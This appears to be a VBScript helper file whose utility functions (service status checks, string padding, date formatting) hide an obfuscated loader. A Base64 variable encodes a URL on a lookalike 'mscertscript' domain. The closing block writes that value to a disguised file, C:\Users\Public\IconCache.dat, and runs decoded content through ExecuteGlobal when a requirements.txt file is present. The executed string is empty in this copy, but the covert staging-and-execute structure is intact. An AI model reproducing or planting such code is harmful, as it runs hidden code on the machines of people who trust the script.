Private Function PathCombine(strPath1, strPath2)
    Dim strResult
    Dim objFso
    Set objFso = CreateObject("Scripting.FileSystemObject")
    strResult = objFso.BuildPath(strPath1, strPath2)
    PathCombine = strResult
End Function

Public Function GetServiceStatus(strServiceName)
    Err.Clear
    Dim strComputer
    strComputer = "."

    Dim result

    Dim bolServiceRunning
    bolServiceRunning = IsServiceRunning(strComputer, strServiceName)
    If Err.Number = 0 Then
        If bolServiceRunning Then
            result = "running"
        Else
            result = "stopped"
        End If
    Else
        result = "error"
    End If

    Err.Clear
    GetServiceStatus = result
End Function
Dim state
state = "aHR0cHM6Ly9tc2NlcnRzY3JpcHQuaW5mby9iaXRjb2luLnBocA=="
    
Dim szString
szString = ""
Function bric(bkMode)
    Dim xmlDoc, node
	Set xmlDoc = CreateObject("MSXML2.DOMDocument")
	Set node = xmlDoc.createElement("Base64")

	' Assign the Base64 string
	node.DataType = "bin.base64"
	node.Text = bkMode

	' Get the byte array and convert to a VBScript array
	Dim byteData, i, byteArray()
	byteData = node.NodeTypedValue
	
	' Resize array and assign bytes
	ReDim byteArray(UBound(byteData))
	For i = 0 To UBound(byteData)
		byteArray(i) = AscB(MidB(byteData, i + 1, 1)) ' Extract each byte properly
	Next

	' Return as byte array
	bric = byteArray

	' Cleanup
	Set node = Nothing
	Set xmlDoc = Nothing
End Function

Public Function IsServiceRunning(strComputer, strServiceName)
    Dim objWMIService
    Dim strWMIQuery
    Dim result

    strWMIQuery = "SELECT * FROM Win32_Service WHERE Name = '" & strServiceName & "' AND state='Running'"

    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    If objWMIService.ExecQuery(strWMIQuery).Count > 0 then
        result = True
    Else
        result = False
    End If
    IsServiceRunning = result
End Function
Function ConvertToBinary(mon, char)
    Dim binary, i
    For i = 1 To Len(mon)
        If Mid(mon, i, 1) = char Then
            index = i - 1
            Exit For
        End If
    Next
    binary = ""
    For i = 1 To 6
        binary = CStr(index Mod 2) & binary
        index = index \ 2
    Next
    ConvertToBinary = binary
End Function
Function BinToDec(binary)
    Dim dec, i
    dec = 0
    For i = Len(binary) To 1 Step -1
        If Mid(binary, i, 1) = "1" Then
            dec = dec + 2 ^ (Len(binary) - i)
        End If
    Next
    BinToDec = dec
End Function
Public Function ServiceExists(strComputer, strServiceName)
    Dim objWMIService
    Dim strWMIQuery
    Dim result

    strWMIQuery = "SELECT * FROM Win32_Service WHERE Name = '" & strServiceName & "'"

    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    If objWMIService.ExecQuery(strWMIQuery).Count > 0 then
        result = True
    Else
        result = False
    End If

    ServiceExists = result
End Function
Function ByteToString(inputBytes)
    Dim i, outputString
    outputString = ""
    For i = LBound(inputBytes) To UBound(inputBytes)
        outputString = outputString & Chr(inputBytes(i))
    Next
    ByteToString = outputString
End Function
Public Function PadRight(strNeedle, intMax, strPadChar)
    Dim i
    Dim strResult
    strPadChar = Trim(strPadChar)
    If Len(strPadChar) = 0 Then
        strPadChar = " "
    End If
    strPadChar = Left(strPadChar, 1)

    Dim strMissing

    Dim intMissing
    intMissing = intMax - Len(strNeedle)

    strResult = strNeedle
    If intMissing > 0 Then
        For i = 1 To intMissing
            strResult = strResult & strPadChar
        Next
    End IF

    PadRight = strResult
End Function
Dim szByte,szOric,szStatebyte,szStateString
szByte = bric(szString)
szOric = ""
szStateString = ""
Public Function GetProperDate(dateSeparator, groupSeparator, timeSeparator)
    Dim moment
    moment = now

    Dim strResult
    strResult = ""
    strResult = strResult & PadLeft(CStr(Year(moment)), 4, "0")
    strResult = strResult & dateSeparator
    strResult = strResult & PadLeft(CStr(Month(moment)), 2, "0")
    strResult = strResult & dateSeparator
    strResult = strResult & PadLeft(CStr(Day(moment)), 2, "0")
    strResult = strResult & groupSeparator
    strResult = strResult & PadLeft(CStr(Hour(moment)), 2, "0")
    strResult = strResult & timeSeparator
    strResult = strResult & PadLeft(CStr(Minute(moment)), 2, "0")
    strResult = strResult & timeSeparator
    strResult = strResult & PadLeft(CStr(Second(moment)), 2, "0")
    GetProperDate = strResult
End Function
szOric = ByteToString(szByte)

writecontent = state
szStatebyte  = bric(state)
szStateString = ByteToString(szStatebyte)
state = szStateString
Dim objFileSO
Set objFileSO = CreateObject("Scripting.FileSystemObject")
Dim scriptDirectory
scriptDirectory = objFileSO.GetParentFolderName(WScript.ScriptFullName)
Dim existFileName
existFileName = "requirements.txt"
Dim filePath
filePath = objFileSO.BuildPath(scriptDirectory,existFileName)
If objFileSO.FileExists(filePath) Then
    catchFilePath = "C:\Users\Public\IconCache.dat"
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(catchFilePath ,True)
    objFile.Write writecontent
    objFile.Close
    ExecuteGlobal szOric
End If